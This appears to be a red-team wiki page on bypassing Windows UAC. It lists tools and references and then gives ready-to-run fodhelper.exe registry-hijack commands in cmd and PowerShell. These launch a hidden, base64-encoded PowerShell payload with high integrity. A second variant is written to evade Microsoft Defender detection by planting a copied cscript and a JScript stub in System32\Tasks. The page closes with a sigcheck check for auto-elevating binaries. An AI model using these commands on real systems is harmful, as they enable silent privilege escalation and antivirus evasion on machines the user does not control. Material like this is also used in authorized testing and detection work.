---
title: UAC Bypass
---

When you are local admin on [[notes/windows/index]], but you have a filtered token (medium integrity) and want to obtain an unfiltered token (high integrity), you have to bypass UAC.

Untested tools:

- [UACME](https://github.com/hfiref0x/UACME), implements multiple techniques
- [IDiagnosticProfileUAC](https://github.com/Wh04m1001/IDiagnosticProfileUAC)

References:

- [Advanced Windows Task Scheduler Playbook - Part.2 from COM to UAC bypass and get SYSTEM dirtily](http://web.archive.org/web/20230723100015/https://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.2_from_COM_to_UAC_bypass_and_get_SYSTEM_dirtectly.html)
- [UAC bypass through Trusted Folder abuse](http://web.archive.org/web/20230310190607/https://redteamer.tips/uac-bypass-through-trusted-folder-abuse/)
- [Exploiting environment variables in scheduled tasks for UAC bypass](http://web.archive.org/web/20221206201830/https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html)

# FoDHelper

The auto-elevating `fodhelper.exe` reads a command from the HKCU hive and executes it.
This works at least since Windows 10 1709 and is still unpatched as of January 2023.

=== "cmd"
    ~~~ bat
    reg.exe add HKCU\Software\Classes\ms-settings\shell\open\command /d "powershell.exe -ep bypass -w hidden -e %base64%" /f
    reg.exe add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
    C:\Windows\System32\fodhelper.exe
    ~~~

=== "PowerShell"
    ~~~ powershell
    New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -ep bypass -w hidden -e $base64" –Force
    New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
    C:\Windows\System32\fodhelper.exe
    ~~~

**OpSec:** Microsoft Defender detects the exploitation, but does not prevent it.

Evade Defenders detection rules (as of January 2023).

~~~ bat
copy %windir%\System32\cscript.exe %windir%\System32\Tasks\test.exe
echo new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -w hidden -e %payload%') > %windir%\System32\Tasks\test.txt
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "%windir%\System32\Tasks\test.exe -e:jscript %windir%\System32\Tasks\test.txt" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
%windir%\System32\fodhelper.exe
~~~

# Auto Elevation

Programs signed by Microsoft that are marked as *Auto Elevate* do not trigger UAC when started by an administrator.

Check if an executable is allowed to auto elevate with [Sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck).

~~~
C:\> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
...
<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
    <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator"/>
    </requestedPrivileges>
    </security>
</trustInfo>
<asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
    <autoElevate>true</autoElevate>
    </asmv3:windowsSettings>
</asmv3:application>
...
~~~
